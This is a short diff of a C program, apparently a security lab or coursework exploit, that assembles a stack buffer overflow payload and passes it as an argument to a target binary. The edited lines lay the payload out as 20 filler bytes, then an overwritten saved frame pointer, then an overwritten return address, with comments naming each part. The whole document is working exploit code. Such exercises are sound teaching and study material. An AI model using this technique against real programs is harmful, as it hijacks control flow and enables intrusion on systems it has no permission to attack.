@@ -9,7 +9,11 @@ int main(void) {
   char *args[3];
   char *env[1];
 
-  char arg[] = {[0 ... 19] = 49, 72, 248, 255, 191, 21, 133, 4, 8};
+  char arg[] = {
+      [0 ... 19] = 'A',       // buffer
+      0x48, 0xF8, 0xFF, 0xBF, // sfp
+      0x15, 0x85, 0x04, 0x08  // ret
+  };
 
   args[0] = TARGET;
   args[1] = arg;
